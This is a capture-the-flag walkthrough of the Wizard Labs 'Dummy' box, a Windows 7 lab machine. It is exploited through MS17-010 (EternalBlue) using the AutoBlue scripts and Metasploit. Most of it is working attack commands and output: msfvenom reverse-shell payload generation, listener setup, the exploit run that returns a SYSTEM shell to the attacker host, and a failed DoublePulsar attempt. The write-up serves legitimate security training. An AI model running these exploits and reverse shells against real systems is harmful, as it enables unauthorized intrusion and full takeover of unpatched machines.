# Wizard Labs: Dummy

[ctf](/tags#ctf ) [wizard-labs](/tags#wizard-labs ) [wl-dummy](/tags#wl-dummy
) [nmap](/tags#nmap ) [smbmap](/tags#smbmap ) [auto-blue](/tags#auto-blue )
[windows](/tags#windows ) [ms17-010](/tags#ms17-010 ) [smb](/tags#smb )
[msfvenom](/tags#msfvenom ) [metasploit](/tags#metasploit ) [htb-
legacy](/tags#htb-legacy )  
  
Feb 22, 2019

Wizard Labs: Dummy

![wl-dummy-cover](https://0xdfimages.gitlab.io/img/wl-dummy-cover.png)

I had an opportunity to check out [Wizard Labs](https://labs.wizard-
security.net) recently. It’s a recently launched service much like HackTheBox.
Their user interface isn’t as polished or feature rich as HTB, but they have
16 vulnerable machines online right now to attack. The box called Dummy
recently retired from their system, so I can safely give it a walk-through.
It’s a bit of bad luck that I looked at this just after doing
[Legacy](/2019/02/21/htb-legacy.html), as they were very similar boxes. Seems
popular to start a service with a Windows SMB vulnerability. This was a
Windows 7 box, vulnerable to MS17-010. I’ll use a different python script, and
give the Metasploit exploit a spin and fail.

## Box Details

Name: | wl-dummy ![](../img/wl-logo.png)  
---|---  
OS: | Windows ![](../img/Windows.png)  
Difficulty: | 2/10  
Creator: | n4ckhcker  
  
## Recon

### nmap

`nmap` shows the Windows NetBios/SMB ports (TCP 135, 139, 445, and UDP 137),
as well as TCP 554. It also identifies the box as Windows 7 SP1:

    
    
    root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.1.1.13 10.1.1.13
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-21 13:05 EST
    Warning: 10.1.1.13 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.1.1.13
    Host is up (0.12s latency).
    Not shown: 55261 filtered ports, 10270 closed ports         
    PORT    STATE SERVICE                                                                             
    135/tcp open  msrpc                                            
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds 
    554/tcp open  rtsp
                                      
    Nmap done: 2 IP addresses (1 host up) scanned in 92.88 seconds
    
    root@kali# nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.1.1.13
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-21 13:11 EST                                          
    Warning: 10.1.1.13 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.1.1.13                                       
    Host is up (0.12s latency).
    Not shown: 65491 open|filtered ports, 43 closed ports
    PORT    STATE SERVICE                                           
    137/udp open  netbios-ns                                                                       
    
    Nmap done: 1 IP address (1 host up) scanned in 86.32 seconds                   
    
    root@kali# nmap -sV -sC -p 135,139,445,554 -oA nmap/scripts 10.1.1.13
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-21 13:13 EST
    Nmap scan report for 10.1.1.13      
    Host is up (0.11s latency). 
                                              
    PORT    STATE SERVICE      VERSION
    135/tcp open  msrpc        Microsoft Windows RPC
    139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
    554/tcp open  rtsp?                                   
    Service Info: Host: DUMMY; OS: Windows; CPE: cpe:/o:microsoft:windows
             
    Host script results:                          
    |_clock-skew: mean: -42m37s, deviation: 1h09m16s, median: -2m38s
    |_nbstat: NetBIOS name: DUMMY, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:8d:a7:77 (VMware)
    | smb-os-discovery:                
    |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional                                      
    |   Computer name: Dummy                                     
    |   NetBIOS computer name: DUMMY\x00                                                              
    |   Workgroup: WORKGROUP\x00                                   
    |_  System time: 2019-02-21T20:12:55+02:00
    | smb-security-mode:       
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode:
    |   2.02:                 
    |_    Message signing enabled but not required
    | smb2-time:        
    |   date: 2019-02-21 13:12:55
    |_  start_date: 2019-01-18 17:53:04                                          
                           
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 136.06 seconds
    

### SMB

#### Null Sessions

I first checked to see if I could access any shares with a null session, but
`smbmap` or `smbclient` agreed I couldn’t:

    
    
    root@kali# smbmap -H 10.1.1.13
    [+] Finding open SMB ports....
    [+] User SMB session establishd on 10.1.1.13...
    [+] IP: 10.1.1.13:445   Name: 10.1.1.13
            Disk                                                    Permissions
            ----                                                    -----------
    [!] Access Denied
    root@kali# smbclient -N -L //10.1.1.13
    Anonymous login successful
    
            Sharename       Type      Comment
            ---------       ----      -------
    smb1cli_req_writev_submit: called for dialect[SMB2_10] server[10.1.1.13]
    Error returning browse list: NT_STATUS_REVISION_MISMATCH
    Reconnecting with SMB1 for workgroup listing.
    Connection to 10.1.1.13 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
    Failed to connect with SMB1 -- no workgroup available
    

#### Vulns

Next I scanned for vulnerabilities, and found MS17-010:

    
    
    root@kali# nmap --script smb-vuln* -p 445 -oA nmap/smb_vuln 10.1.1.13
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-21 13:16 EST
    Nmap scan report for 10.1.1.13
    Host is up (0.12s latency).
    
    PORT    STATE SERVICE
    445/tcp open  microsoft-ds
    
    Host script results:
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
    | smb-vuln-ms17-010:
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    
    Nmap done: 1 IP address (1 host up) scanned in 18.93 seconds
    

## System Shell

### AutoBlue

This time, I decided to give the
[AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010) scripts a try. It’s a
neat system that walks you through shellcode generation and standing up
listeners.

I’ll clone the repo into `/opt`:

    
    
    root@kali# git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git            
    Cloning into 'AutoBlue-MS17-010'...                                              
    remote: Enumerating objects: 1, done.                                                                     
    remote: Counting objects: 100% (1/1), done.                                           
    remote: Total 72 (delta 0), reused 0 (delta 0), pack-reused 71
    Unpacking objects: 100% (72/72), done.
    

Next I’ll prep shellcode, answering the prompts:

    
    
    root@kali# ./shell_prep.sh                  
                     _.-;;-._                                                    
              '-..-'|   ||   |                                                   
              '-..-'|_.-;;-._|                                                   
              '-..-'|   ||   |                                                       
              '-..-'|_.-''-._|                                                   
    Eternal Blue Windows Shellcode Compiler                                      
                                                                                 
    Let's compile them windoos shellcodezzz                                      
                                                                                 
    Compiling x64 kernel shellcode                                                                      
    Compiling x86 kernel shellcode                                                   
    kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
    Y                                                     
    LHOST for reverse connection:                                          
    10.254.1.47                                                
    LPORT you want x64 to listen on:                           
    443
    LPORT you want x86 to listen on:
    445
    Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
    1                                               
    Type 0 to generate a staged payload or 1 to generate a stageless payload
    1                                       
    Generating x64 cmd shell (stageless)...    
    
    msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.254.1.47 LPORT=443
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder or badchars specified, outputting raw payload
    Payload size: 460 bytes
    Saved as: sc_x64_msf.bin
    
    Generating x86 cmd shell (stageless)...
    
    msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.254.1.47 LPORT=445
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    No encoder or badchars specified, outputting raw payload
    Payload size: 324 bytes
    Saved as: sc_x86_msf.bin
    
    MERGING SHELLCODE WOOOO!!!
    DONE
    

Next I’ll run the script to prepare the listeners, giving the same port
numbers and IP I gave in the previous script. It will start Metasploit and
start two listeners:

    
    
    root@kali# ./listener_prep.sh
      __
      /,-
      ||)
      \\_, )
       `--'
    Eternal Blue Metasploit Listener
    
    LHOST for reverse connection:
    10.254.1.47
    LPORT for x64 reverse connection:
    443
    LPORT for x86 reverse connection:
    445
    Enter 0 for meterpreter shell or 1 for regular cmd shell:
    1
    Type 0 if this is a staged payload or 1 if it is for a stageless payload
    1
    Starting listener (stageless)...
    [ ok ] Starting postgresql (via systemctl): postgresql.service.
    
    
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMM                MMMMMMMMMM
    MMMN$                           vMMMM
    MMMNl  MMMMM             MMMMM  JMMMM
    MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
    MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
    MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
    MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
    MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
    MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
    MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
    MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
    MMMMR  ?MMNM             MMMMM .dMMMM
    MMMMNm `?MMM             MMMM` dMMMMM
    MMMMMMN  ?MM             MM?  NMMMMMN
    MMMMMMMMNe                 JMMMMMNMMM
    MMMMMMMMMMNm,            eMMMMMNMMNMM
    MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
    MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
            https://metasploit.com
    
    
           =[ metasploit v5.0.6-dev                           ]
    + -- --=[ 1857 exploits - 1055 auxiliary - 327 post       ]
    + -- --=[ 546 payloads - 44 encoders - 10 nops            ]
    + -- --=[ 2 evasion                                       ]
    
    [*] Processing config.rc for ERB directives.
    resource (config.rc)> use exploit/multi/handler
    resource (config.rc)> set PAYLOAD windows/x64/shell_reverse_tcp
    PAYLOAD => windows/x64/shell_reverse_tcp
    resource (config.rc)> set LHOST 10.254.1.47
    LHOST => 10.254.1.47
    resource (config.rc)> set LPORT 443
    LPORT => 443
    resource (config.rc)> set ExitOnSession false
    ExitOnSession => false
    resource (config.rc)> set EXITFUNC thread
    EXITFUNC => thread
    resource (config.rc)> exploit -j
    [*] Exploit running as background job 0.
    [*] Exploit completed, but no session was created.
    resource (config.rc)> set PAYLOAD windows/shell/reverse_tcp
    [*] Started reverse TCP handler on 10.254.1.47:443
    PAYLOAD => windows/shell/reverse_tcp
    resource (config.rc)> set LPORT 445
    LPORT => 445
    resource (config.rc)> exploit -j
    [*] Exploit running as background job 1.
    [*] Exploit completed, but no session was created.
    [*] Starting persistent handler(s)...
    
    [*] Started reverse TCP handler on 10.254.1.47:445
    msf5 exploit(multi/handler) > 
    

Now I just run the exploit from a different window. It worked on the second
run:

    
    
    root@kali# python eternalblue_exploit7.py 10.1.1.13 shellcode/sc_all.bin
    shellcode size: 2203
    numGroomConn: 13
    Target OS: Windows 7 Professional 7601 Service Pack 1
    SMB1 session setup allocate nonpaged pool success
    SMB1 session setup allocate nonpaged pool success
    good response status: INVALID_PARAMETER
    done
    root@kali# python eternalblue_exploit7.py 10.1.1.13 shellcode/sc_all.bin
    shellcode size: 2203
    numGroomConn: 13
    Target OS: Windows 7 Professional 7601 Service Pack 1
    SMB1 session setup allocate nonpaged pool success
    SMB1 session setup allocate nonpaged pool success
    good response status: INVALID_PARAMETER
    done
    

In Metasploit, I get a callback:

    
    
    [*] Encoded stage with x86/shikata_ga_nai
    [*] Sending encoded stage (267 bytes) to 10.1.1.13
    [*] Command shell session 1 opened (10.254.1.47:445 -> 10.1.1.13:49173) at 2019-02-21 13:28:21 -0500
    
    msf5 exploit(multi/handler) > sessions
    
    Active sessions
    ===============
    
      Id  Name  Type               Information                                                                       Connection
      --  ----  ----               -----------                                                                       ----------
      1         shell x86/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.254.1.47:445 -> 10.1.1.13:49173 (10.1.1.13)
    
    msf5 exploit(multi/handler) > sessions -i 1
    [*] Starting interaction with 1...
    
    More?
    SR<@p   f%_փMgٿ?:6Zdx8}}(ks-cx_JwD`c@MWHȱl hp6
    The system cannot find the file specified.
    
    C:\Windows\system32>whoami
    whoami
    nt authority\system
    

From there I can grab the flags:

    
    
    C:\Users\Admin\Desktop>type root.txt
    68bba2c7...
    
    C:\Users\User\Desktop>type user.txt
    3f819f9f...
    

### Metasploit - Fail

I figured I’d show how to do this with Metasploit as well, but that effort led
to failure.

#### Scan

Since I already have it open, I’ll type `background` into my shell to
background the session. Then I’ll search for the exploit:

    
    
    msf5 exploit(multi/handler) > search ms17-010
    
    Matching Modules
    ================
    
       Name                                           Disclosure Date  Rank     Check  Description
       ----                                           ---------------  ----     -----  -----------
       auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
       auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
       exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
       exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
       exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
    

I’ll give the scanner I run first. I use the scanner and then set the RHOSTS
to the target, and run it. It looks vulnerable:

    
    
    msf5 exploit(multi/handler) > use auxiliary/scanner/smb/smb_ms17_010
    msf5 auxiliary(scanner/smb/smb_ms17_010) > options
    
    Module options (auxiliary/scanner/smb/smb_ms17_010):
    
       Name         Current Setting                                                 Required  Description
       ----         ---------------                                                 --------  -----------
       CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
       CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
       CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
       NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
       RHOSTS                                                                       yes       The target address range or CIDR identifier
       RPORT        445                                                             yes       The SMB service port (TCP)
       SMBDomain    .                                                               no        The Windows domain to use for authentication
       SMBPass                                                                      no        The password for the specified username
       SMBUser                                                                      no        The username to authenticate as
       THREADS      1                                                               yes       The number of concurrent threads
    
    msf5 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.1.1.13
    RHOSTS => 10.1.1.13
    msf5 auxiliary(scanner/smb/smb_ms17_010) > run
    
    [+] 10.1.1.13:445         - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x86 (32-bit)
    [*] 10.1.1.13:445         - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    

#### Built In

That’s good, and confirms what I already know from AutoBlue. The output from
the scan shows this is a x86 system, which is a problem, as the standard
Metasploit modules for MS17-010 only target x64 systems.

I can switch to the `exploit/windows/ms17_010_eternalblue` module, but when I
run `options` and `show targets`, I’ll see only x64 is supported:

    
    
    msf5 exploit(windows/smb/ms17_010_eternalblue) > options
    
    Module options (exploit/windows/smb/ms17_010_eternalblue):
    
       Name           Current Setting  Required  Description
       ----           ---------------  --------  -----------
       RHOSTS                          yes       The target address range or CIDR identifier
       RPORT          445              yes       The target port (TCP)
       SMBDomain      .                no        (Optional) The Windows domain to use for authentication
       SMBPass                         no        (Optional) The password for the specified username
       SMBUser                         no        (Optional) The username to authenticate as
       VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
       VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Windows 7 and Server 2008 R2 (x64) All Service Packs
    
    
    msf5 exploit(windows/smb/ms17_010_eternalblue) > show targets
    
    Exploit targets:
    
       Id  Name
       --  ----
       0   Windows 7 and Server 2008 R2 (x64) All Service Packs
    

#### Outside Module

There are several tutorials out there (like [this
one](https://www.cybrary.it/0p3n/hack-windows-eternalblue-exploit-
metasploit/)) that show how to load an outside exploit into Metasploit to
target x86 machines. To do so, I must load 32-bit Wine. I followed the
tutorial, but I was unable to get a session. It would tell me that the
backdoor was installed, but it was unable to trigger it:

    
    
    msf5 exploit(windows/smb/eternalblue_doublepulsar) > run
    
    [*] Started reverse TCP handler on 10.254.1.47:4444
    [*] 10.1.1.13:445 - Generating Eternalblue XML data
    [*] 10.1.1.13:445 - Generating Doublepulsar XML data
    [*] 10.1.1.13:445 - Generating payload DLL for Doublepulsar
    [*] 10.1.1.13:445 - Writing DLL in /root/.wine/drive_c/eternal11.dll
    [*] 10.1.1.13:445 - Launching Eternalblue...
    [+] 10.1.1.13:445 - Pwned! Eternalblue success!
    [*] 10.1.1.13:445 - Launching Doublepulsar...
    [+] 10.1.1.13:445 - Remote code executed... 3... 2... 1...
    [*] Exploit completed, but no session was created.      
    

On another attempt, it even finds the backdoor, but still returns no shell:

    
    
    msf5 exploit(windows/smb/eternalblue_doublepulsar) > run
                                             
    [*] Started reverse TCP handler on 10.254.1.47:4444
    [*] 10.1.1.13:445 - Generating Eternalblue XML data
    [*] 10.1.1.13:445 - Generating Doublepulsar XML data
    [*] 10.1.1.13:445 - Generating payload DLL for Doublepulsar
    [*] 10.1.1.13:445 - Writing DLL in /root/.wine/drive_c/eternal11.dll
    [*] 10.1.1.13:445 - Launching Eternalblue...
    [+] 10.1.1.13:445 - Backdoor is already installed
    [*] 10.1.1.13:445 - Launching Doublepulsar...
    [+] 10.1.1.13:445 - Remote code executed... 3... 2... 1...
    [*] Exploit completed, but no session was created.
    

The fact that the exploit recognizes the backdoor tells me that the exploit is
working, but that something on my machine isn’t configured correctly. I
expected showing Metasploit to be the easier path. At this point, I’d tell
you, just use AutoBlue!

[](/2019/02/22/wl-dummy.html)

